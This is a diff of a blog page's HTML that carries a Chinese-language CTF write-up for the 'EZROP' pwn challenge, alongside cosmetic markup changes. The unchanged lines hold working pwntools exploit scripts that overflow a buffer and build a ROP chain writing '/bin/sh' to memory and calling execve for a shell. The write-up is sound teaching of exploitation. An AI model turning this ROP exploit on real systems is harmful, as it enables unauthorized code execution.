@@ -220,11 +220,11 @@
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -305,13 +305,13 @@
         <h1 id="ROP-EZROP-b33f-adv-pwn"><a href="#ROP-EZROP-b33f-adv-pwn" class="headerlink" title="ROP-EZROP(b33f adv_pwn)"></a>ROP-EZROP(b33f adv_pwn)</h1><blockquote>
 <p>Author:堇姬</p>
 </blockquote>
-<h2 id="確認保護"><a href="#確認保護" class="headerlink" title="確認保護"></a>確認保護</h2><div class="img-item" data-src="/2024/05/17/ROP-EZROP/checksec.png" data-sub-html=".caption"><img src="/2024/05/17/ROP-EZROP/checksec.png" class=""></div>
+<h2 id="確認保護"><a href="#確認保護" class="headerlink" title="確認保護"></a>確認保護</h2><img src="/2024/05/17/ROP-EZROP/checksec.png" class="">
 
 <p>開NX沒辦法寫shellcode，另外他開了canary，但其實沒開(沒有check canary的判斷式)</p>
-<div class="img-item" data-src="/2024/05/17/ROP-EZROP/NOCANARY.png" data-sub-html=".caption"><img src="/2024/05/17/ROP-EZROP/NOCANARY.png" class=""></div>
+<img src="/2024/05/17/ROP-EZROP/NOCANARY.png" class="">
 
 <p>如果有開會有這個</p>
-<div class="img-item" data-src="/2024/05/17/ROP-EZROP/NOCANARYdemo.png" data-sub-html=".caption"><img src="/2024/05/17/ROP-EZROP/NOCANARYdemo.png" class=""></div>
+<img src="/2024/05/17/ROP-EZROP/NOCANARYdemo.png" class="">
 
 
 <h2 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h2><p>read的buffer overflow一樣給好給滿</p>
@@ -321,8 +321,7 @@
 <ul>
 <li>execve(‘&#x2F;bin&#x2F;sh’)</li>
 </ul>
-<div class="table-responsive">
-<table class="table table-bordered table-striped">
+<table>
 <thead>
 <tr>
 <th>暫存器</th>
@@ -348,8 +347,7 @@
 </tbody></table>
 <p>先找看看有沒有pop register;ret之類的可以控這些register</p>
 <p>ROPgadget找位置</p>
-<div class="table-responsive">
-<table class="table table-bordered table-striped">
+<table>
 <thead>
 <tr>
 <th>暫存器</th>
@@ -380,8 +378,7 @@
 <p>目前發現所有register都是可控的<br>但是我們必須找到一段可以寫入<code>/bin/sh</code>的地方，所以我們可以嘗試用這種gadget</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov QWORD PTR [register1], register2;ret</span><br></pre></td></tr></table></figure>
 <p>他會把<code>register2</code>的值寫入到<code>register1</code>所存值得記憶體位置</p>
-<div class="table-responsive">
-<table class="table table-bordered table-striped">
+<table>
 <thead>
 <tr>
 <th>暫存器</th>
@@ -394,10 +391,10 @@
 </tr>
 </tbody></table>
 <p>目前看到data段0x4c5000~0x4c8000可寫，所以嘗試去找看起來沒用到的memory</p>
-<div class="img-item" data-src="/2024/05/17/ROP-EZROP/vmmap.png" data-sub-html=".caption"><img src="/2024/05/17/ROP-EZROP/vmmap.png" class=""></div>
+<img src="/2024/05/17/ROP-EZROP/vmmap.png" class="">
 
 <p><code>0x4c50e0</code>看起來沒東西，嘗試寫到那。</p>
-<div class="img-item" data-src="/2024/05/17/ROP-EZROP/memorycanwbinsh.png" data-sub-html=".caption"><img src="/2024/05/17/ROP-EZROP/memorycanwbinsh.png" class=""></div>
+<img src="/2024/05/17/ROP-EZROP/memorycanwbinsh.png" class="">
 
 <p>stack狀況</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AAAAAA(0x48個蓋buf跟old rbp)</span><br><span class="line">pop rdx ; pop rbx</span><br><span class="line">/bin/sh\x00</span><br><span class="line">0</span><br><span class="line">pop rsi</span><br><span class="line">0x4c50e0</span><br><span class="line">mov qword ptr [rsi], rdx ; ret</span><br></pre></td></tr></table></figure>
@@ -406,11 +403,10 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">tst=<span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> tst==<span class="number">1</span>:</span><br><span class="line">    r=remote(<span class="string">&#x27;chall.nckuctf.org&#x27;</span>, <span class="number">10007</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r=process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_binsh=&#123;</span><br><span class="line">    <span class="string">&quot;pop_rdx_addr&quot;</span>:<span class="number">0x485a8b</span>,</span><br><span class="line">    <span class="string">&quot;pop_rdx_value&quot;</span>:<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;pop_rbx_value&quot;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;pop_rsi_addr&quot;</span>:<span class="number">0x409f0e</span>,</span><br><span class="line">    <span class="string">&quot;pop_rsi_value&quot;</span>:<span class="number">0x4c50e0</span>,</span><br><span class="line">    <span class="string">&quot;mov&quot;</span>:<span class="number">0x487e8a</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">writebinsh_payload=flat(write_binsh[<span class="string">&quot;pop_rdx_addr&quot;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&quot;pop_rdx_value&quot;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&quot;pop_rbx_value&quot;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&quot;pop_rsi_addr&quot;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&#x27;pop_rsi_value&#x27;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&quot;mov&quot;</span>]                       </span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">gdb.attach(r,<span class="string">&quot;b *0x00000000004017f2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Give me your overflow: &#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+writebinsh_payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>已經成功把<code>/bin/sh</code>寫到<code>0x4c50e0</code></p>
-<div class="img-item" data-src="/2024/05/17/ROP-EZROP/gdb.png" data-sub-html=".caption"><img src="/2024/05/17/ROP-EZROP/gdb.png" class=""></div>
+<img src="/2024/05/17/ROP-EZROP/gdb.png" class="">
 
 <p>接下來開始堆參數</p>
-<div class="table-responsive">
-<table class="table table-bordered table-striped">
+<table>
 <thead>
 <tr>
 <th>暫存器</th>
@@ -449,7 +445,7 @@
 
 <p>這樣就成功堆出execve了</p>
 <h2 id="Solve-Script"><a href="#Solve-Script" class="headerlink" title="Solve Script"></a>Solve Script</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">tst=<span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> tst==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    r=remote(<span class="string">&#x27;chall.nckuctf.org&#x27;</span>, <span class="number">10007</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r=process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_binsh=&#123;</span><br><span class="line">    <span class="string">&quot;pop_rdx_addr&quot;</span>:<span class="number">0x485a8b</span>,</span><br><span class="line">    <span class="string">&quot;pop_rdx_value&quot;</span>:<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;pop_rbx_value&quot;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;pop_rsi_addr&quot;</span>:<span class="number">0x409f0e</span>,</span><br><span class="line">    <span class="string">&quot;pop_rsi_value&quot;</span>:<span class="number">0x4c50e0</span>,</span><br><span class="line">    <span class="string">&quot;mov&quot;</span>:<span class="number">0x487e8a</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">writebinsh_payload=flat(write_binsh[<span class="string">&quot;pop_rdx_addr&quot;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&quot;pop_rdx_value&quot;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&quot;pop_rbx_value&quot;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&quot;pop_rsi_addr&quot;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&#x27;pop_rsi_value&#x27;</span>],</span><br><span class="line">                        write_binsh[<span class="string">&quot;mov&quot;</span>]                       </span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">ROPvar=&#123;</span><br><span class="line">    <span class="string">&#x27;pop_rax_ret&#x27;</span>:<span class="number">0x44fd07</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rdi_ret&#x27;</span>:<span class="number">0x401e9f</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rsi_ret&#x27;</span>:<span class="number">0x409f0e</span>,</span><br><span class="line">    <span class="string">&#x27;pop_rdx_rbx_ret&#x27;</span>:<span class="number">0x485a8b</span>,</span><br><span class="line">    <span class="string">&#x27;syscall&#x27;</span>:<span class="number">0x401c54</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">STACKvar=&#123;</span><br><span class="line">    <span class="string">&#x27;rax_var&#x27;</span>:<span class="number">0x3b</span>,</span><br><span class="line">    <span class="string">&#x27;rdi_var&#x27;</span>:<span class="number">0x4c50e0</span>,</span><br><span class="line">    <span class="string">&#x27;rsi_var&#x27;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;rdx_var&#x27;</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;rbx_var&#x27;</span>:<span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ROP_payload=flat(ROPvar[<span class="string">&#x27;pop_rax_ret&#x27;</span>],</span><br><span class="line">                STACKvar[<span class="string">&#x27;rax_var&#x27;</span>],</span><br><span class="line">                ROPvar[<span class="string">&#x27;pop_rdi_ret&#x27;</span>],</span><br><span class="line">                STACKvar[<span class="string">&#x27;rdi_var&#x27;</span>],</span><br><span class="line">                ROPvar[<span class="string">&#x27;pop_rsi_ret&#x27;</span>],</span><br><span class="line">                STACKvar[<span class="string">&#x27;rsi_var&#x27;</span>],</span><br><span class="line">                ROPvar[<span class="string">&#x27;pop_rdx_rbx_ret&#x27;</span>],</span><br><span class="line">                STACKvar[<span class="string">&#x27;rdx_var&#x27;</span>],</span><br><span class="line">                STACKvar[<span class="string">&#x27;rbx_var&#x27;</span>],</span><br><span class="line">                ROPvar[<span class="string">&#x27;syscall&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> tst!=<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    gdb.attach(r,<span class="string">&quot;b *0x00000000004017f2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;Give me your overflow: &#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+writebinsh_payload+ROP_payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<div class="img-item" data-src="/2024/05/17/ROP-EZROP/getflag.png" data-sub-html=".caption"><img src="/2024/05/17/ROP-EZROP/getflag.png" class=""></div>
+<img src="/2024/05/17/ROP-EZROP/getflag.png" class="">
 
       
     </div>
@@ -537,7 +533,7 @@
     
       <div>
         <span class="icon-brush"></span>
-        149.8k
+        149.6k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
         13:10
@@ -589,11 +585,11 @@
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
